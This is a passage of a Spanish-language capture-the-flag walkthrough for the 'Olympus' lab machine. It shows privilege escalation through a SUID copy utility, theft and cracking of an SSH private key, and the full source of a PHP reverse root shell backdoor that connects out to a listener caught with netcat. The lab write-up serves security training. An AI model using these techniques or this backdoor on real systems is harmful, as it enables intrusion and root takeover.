/bin/sh: 0: can't access tty; job control turned off
$ 
```

Bien, estamos dentro. Vamos a estabilizar la shell lo primero

```console
[...]
$ which python2 python3
/usr/bin/python3
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@olympus:/$ 
```

Y empezamos a brujulear ...

```console
[...]
www-data@olympus:/$ pwd
pwd
/
www-data@olympus:/$ cd home
cd home
www-data@olympus:/home$ ls
ls
zeus
www-data@olympus:/home$ cd zeus
cd zeus
www-data@olympus:/home/zeus$ ls
ls
snap  user.flag  zeus.txt
www-data@olympus:/home/zeus$ cat user.flag
cat user.flag
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}
www-data@olympus:/home/zeus$ cat zeus.txt
cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



                                                - Prometheus.
www-data@olympus:/home/zeus$ 
```

OK, hemos conseguido la segunda flag y un mensaje de *Prometheus* a su colega *Zeus* poniendo a caldo al chico de IT y alardeando de disponer de un acceso permanente como super usuario al server.

Seguimos trasteando un poco a ver qué encontramos.

```console
[...]
www-data@olympus:/home/zeus$ ls -la
ls -la
total 48
drwxr-xr-x 7 zeus zeus 4096 Apr 19 08:40 .
drwxr-xr-x 3 root root 4096 Mar 22 15:12 ..
lrwxrwxrwx 1 root root    9 Mar 23 08:58 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 .bashrc
drwx------ 2 zeus zeus 4096 Mar 22 15:13 .cache
drwx------ 3 zeus zeus 4096 Apr 14 09:56 .gnupg
drwxrwxr-x 3 zeus zeus 4096 Mar 23 08:33 .local
-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
drwx------ 2 zeus zeus 4096 Apr 14 10:35 .ssh
-rw-r--r-- 1 zeus zeus    0 Mar 22 15:13 .sudo_as_admin_successful
drwx------ 3 zeus zeus 4096 Apr 14 09:56 snap
-rw-rw-r-- 1 zeus zeus   34 Mar 23 08:34 user.flag
-r--r--r-- 1 zeus zeus  199 Apr 15 07:28 zeus.txt
www-data@olympus:/home/zeus$ 

```

La teoría nos dice que el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/.ssh</code>&nbsp;&nbsp;es donde se almacenan, de existir, las claves pública <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">id_rsa.pub</code>&nbsp;&nbsp;y privada <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">id_rsa</code>&nbsp;necesarias para acceder por ssh (recordemos que el puerto 22/tcp aparecía abierto).

El problema ? ... el directorio pertenece a *zeus* y no tenemos acceso con nuestro usuario actual *www-data*. Toca escalar privilegios.

## Escalado de privilegios

Tiramos por los clásicos y buscamos enumerar binarios con el bit SUID activado.

```console
[...]
www-data@olympus:/home/zeus$ find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
< find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 142696 Feb 23 18:25 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Dec  2  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 22840 Feb 21 12:58 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 zeus zeus 17728 Apr 18 09:27 /usr/bin/cputils
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /usr/bin/mount
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 31032 Feb 21 12:58 /usr/bin/pkexec
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /usr/bin/su
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /usr/bin/umount
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 123560 Apr  8 19:36 /snap/snapd/15534/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 123560 Jun 15 13:41 /snap/snapd/16292/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 85064 Jul 14  2021 /snap/core20/1434/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Jul 14  2021 /snap/core20/1434/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Jul 14  2021 /snap/core20/1434/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /snap/core20/1434/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /snap/core20/1434/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Jul 14  2021 /snap/core20/1434/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /snap/core20/1434/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1434/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /snap/core20/1434/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Jun 11  2020 /snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Dec  2  2021 /snap/core20/1434/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 85064 Mar 14 08:26 /snap/core20/1518/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Mar 14 08:26 /snap/core20/1518/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Mar 14 08:26 /snap/core20/1518/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7 13:33 /snap/core20/1518/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Mar 14 08:26 /snap/core20/1518/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Mar 14 08:26 /snap/core20/1518/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7 13:33 /snap/core20/1518/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1518/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7 13:33 /snap/core20/1518/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Apr 29 12:03 /snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30 13:03 /snap/core20/1518/usr/lib/openssh/ssh-keysign
www-data@olympus:/home/zeus$
```

Entre el listado que obtenemos aparece un tal <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/usr/bin/cputils</code>&nbsp;&nbsp;que llama mi atención. Por qué ? porque no se lo que es.

Buscamos en Google. Nada :(

Intentamos ver su página man

```console
[...]
www-data@olympus:/home/zeus$ man cputils
man cputils
No manual entry for cputils
www-data@olympus:/home/zeus$
```

El nombre da a pensar que se trate de una utilidad para *copiar cosas*, por lo de *cp*, pero a saber. Hay que salir de dudas.

```console
[...]
www-data@olympus:/home/zeus$ cputils
cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: zeus.txt
zeus.txt

Enter the Name of Target File: /tmp/copia_zeus.txt
/tmp/copia_zeus.txt

File copied successfully.
www-data@olympus:/home/zeus$
www-data@olympus:/home/zeus$ ls -la /tmp/copia_zeus.txt
ls -la /tmp/copia_zeus.txt
-rw-rw-rw- 1 zeus www-data 199 Aug  6 19:17 /tmp/copia_zeus.txt
www-data@olympus:/home/zeus$ 
```
Qué hemos hecho ?

* Copiar un fichero desde nuestra ubicación al directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/tmp</code>&nbsp;.

* Comprobar que se ha copiado.

Qué hemos averiguado ?

* Que efectivamente **cputils** es una utilidad que nos permite copiar ficheros entre diferentes ubicaciones, pero no solo eso ...

* Que al ejecutarla y copiar un fichero de un sitio a otro, el fichero copiado cambia sus permisos y el grupo al que pertenece.

```console
[...]
# el fichero en su ubicación original
www-data@olympus:/home/zeus$ ls -la
[...]
-r--r--r-- 1 zeus zeus  199 Apr 15 07:28 zeus.txt
www-data@olympus:/home/zeus$ 

# el fichero copiado a /tmp
www-data@olympus:/home/zeus$ ls -la /tmp/copia_zeus.txt
[...]
-rw-rw-rw- 1 zeus www-data 199 Aug  6 19:17 /tmp/copia_zeus.txt
www-data@olympus:/home/zeus$ 
```
Y si utilizamos esto para copiar la clave privada ssh ?

```console
[...]
www-data@olympus:/home/zeus$ cputils
cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: .ssh/id_rsa
.ssh/id_rsa

Enter the Name of Target File: /tmp/zeus_id_rsa
/tmp/zeus_id_rsa

File copied successfully.
www-data@olympus:/home/zeus$ ls -la /tmp/zeus_id_rsa
ls -la /tmp/zeus_id_rsa
-rw-rw-rw- 1 zeus www-data 2655 Aug  6 19:49 /tmp/zeus_id_rsa
www-data@olympus:/home/zeus$ cat /tmp/zeus_id_rsa
cat /tmp/zeus_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
[...]
-----END OPENSSH PRIVATE KEY-----
www-data@olympus:/home/zeus$ 
```

OK. Copiamos la clave desde el terminal a un fichero en local y lo guardamos en nuestro directorio de trabajo como *zeus_id_rsa*. Probamos a conectarnos con el server via ssh utilizando esta clave.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sudo ssh -i zeus_id_rsa zeus@10.10.129.191
[sudo] password for ewan67: 
The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.
Enter passphrase for key 'zeus_id_rsa': 
```

Significado de las flags:

* `-i`&nbsp;: identity_file.

Mal rollo, la clave tiene una passphrase que desconocemos.

Tiramos de **ssh2john** (para transformar la clave al formato de John The Reaper) y del propio **john** para crakearla.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ ssh2john zeus_id_rsa > zeus_id_rsa.hash

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zeus_id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxx        (zeus_id_rsa)
1g 0:00:01:27 DONE (2022-08-06 22:12) 0.01145g/s 17.22p/s 17.22c/s 17.22C/s maurice..bunny
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Con la clave anterior volvemos a intentar la conexion ssh.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ sudo ssh -i zeus_id_rsa zeus@10.10.129.191
[sudo] password for ewan67: 
The authenticity of host '10.10.129.191 (10.10.129.191)' can't be established.
ED25519 key fingerprint is SHA256:XbXc3bAs1IiavZWj9IgVFZORm5vh2hzeSuStvOcjhcI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.191' (ED25519) to the list of known hosts.
Enter passphrase for key 'zeus_id_rsa': 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

[...]

Last login: Sat Jul 16 07:52:39 2022
zeus@olympus:~$ 
```

Ahora viene la parte donde echamos mano de ese fichero que todos guardamos como oro en paño en nuestro ordenador con un listado de comandos "mágicos". Tras varias pruebas con el mio, doy con esto:

```console
[...]
zeus@olympus:~$ find / -type f -group zeus 2>/dev/null
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.ssh/authorized_keys
/home/zeus/.ssh/id_rsa
/home/zeus/.ssh/id_rsa.pub
/home/zeus/snap/lxd/common/config/config.yml
/home/zeus/.gnupg/pubring.kbx
/home/zeus/.gnupg/trustdb.gpg
/home/zeus/.bashrc
/home/zeus/.profile
/home/zeus/.cache/motd.legal-displayed
/usr/bin/cputils
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
/var/crash/_usr_bin_cp-utils.1000.crash
/proc/1165/task/1165/fdinfo/0
/proc/1165/task/1165/fdinfo/1
[...]
zeus@olympus:~$ 
```

Un listado de los ficheros a los que tiene acceso el grupo *zeus* en el que hay dos que nos llaman la atención.

```
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

Fijaros que estos ficheros no cuelgan de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/olympus.thm/public_html/</code>&nbsp;&nbsp;sino de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/var/www/html/</code>&nbsp;&nbsp;con lo que deberemos acceder a ellos directamente por IP.

Cargamos en un navegador la URL:

```
http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
```

Nada, ni tirando del código fuente. Probamos con la siguiente

```
http://10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

Nos pinta esto:

![](/assets/posts/20220804/img09.png)

Echamos un veo al código fuente

```
<form name="auth" method="POST">Password: <input type="password" name="password" /></form>
```

Lo espartano del código HTML nos da dos pistas:

* El propio fichero es el target del formulario dado que no hay atributo *action* establecido.

* Se envía directamente, sin ninguna función js que controle el contenido del input *"password"*, con lo que es probable que esa validación la haga el propio fichero en el lado servidor.

Si el propio fichero *VIGQFQFMYOST.php* es el encargado de gestionar la request POST, nos interesa conocer su contenido.

```console
zeus@olympus:~$ cd /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -la
total 12
drwxrwx--x 2 root     zeus     4096 Jul 15 20:55 .
drwxr-xr-x 3 www-data www-data 4096 May  1 09:01 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14 09:54 index.html
-rwxr-xr-x 1 root     zeus     1589 Jul 15 20:55 VIGQFQFMYOST.php
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php 
<?php
$pass = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
zeus@olympus:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ 
```

Analizamos el código del fichero y vemos que en la primer línea se define una variable *$pass*, seguida de un bloque que la compara con el contenido del input *"password"* del form.

Volvemos al navegador, rellenamos el input con el valor de *$pass* y le damos al Enter. Nos aparece lo siguiente:

![](/assets/posts/20220804/img10.png)

Un mensaje con intrucciones para cargar una shell reversa que promete acceso como root. La puerta trasera de la que hablaba Prometheus quizas ?

Seguimos las instrucciones del mensaje

* Iniciamos un **netcat** escuchando en el puerto 4433 en este caso.

* Cargamos la URL con la info necesaria.

```
10.10.129.191/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.xx.xx&port=4433
```

Nos vamos al terminal con el **nc** que hemos puesto a escuchar en el puerto 4433 y una vez conectados empezamos a trastear:

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
└─$ nc -lvnp 4433
listening on [any] 4433 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.129.191] 56506
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:48:48 up  1:18,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/0    10.18.xx.xx      21:34   35:30   0.04s  0.04s -bash
whoami
root
python3 -c "import pty;pty.spawn('/bin/bash')"
root@olympus:/# pwd
pwd
/
root@olympus:/# cd root
cd root
root@olympus:/root# ls -la
ls -la
total 44
drwx------  7 root root 4096 Apr 24 18:06 .
drwxr-xr-x 19 root root 4096 Mar 22 14:53 ..
lrwxrwxrwx  1 root root    9 Mar 23 08:58 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar 22 15:18 .cache
drwxr-xr-x  3 root root 4096 Mar 22 15:44 .local
-rw-------  1 root root 2866 Apr 24 18:06 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Mar 22 15:12 .ssh
drwxr-xr-x  3 root root 4096 Mar 22 15:26 config
-rw-r--r--  1 root root 1576 Apr 18 09:32 root.flag
drwx------  3 root root 4096 Mar 22 15:12 snap
root@olympus:/root# 
root@olympus:/root# cat root.flag
cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{xxxxxxxxxxxxxxxxxxxx}


PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
root@olympus:/root# 
```

Tenemos la tercer flag.

Como parte del mensaje con la flag, nos cuentan que Prometheus ha dejado una cuarta bandera escondida en algun sitio y nos recomiendan logarnos como root sobre ssh para poder buscarla mediante algun comando basado en regex. Por otra parte, el hint de esta última bandera os dice que podría estar en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/etc</code>&nbsp;.

```console
[...]
root@olympus:/root# cd /etc
cd /etc
root@olympus:/etc# grep -irl flag{
grep -irl flag{
ssl/private/.b0nus.fl4g
root@olympus:/etc# cat ssl/private/.b0nus.fl4g
cat ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{xxxxxxxxxxxxxxxx}

As a reminder, here is a usefull regex :

grep -irl flag{

Hope you liked the room ;)
root@olympus:/etc# 
```

Significado de las flags del comando grep:

* `-i`&nbsp;: Ignore case distinctions in patterns and input data.
* `-r`&nbsp;: Recursivo *Read  all  files under each directory, recursively*.
* `-l`&nbsp;: Suprime la salida normal y en su lugar imprime el nombre de cada archivo de entrada.

## Final

Enhorabuena a los que habéis llegado hasta aquí. Espero que esta guía os haya resultado de ayuda.

Sed buenos si no hay una opción mejor.



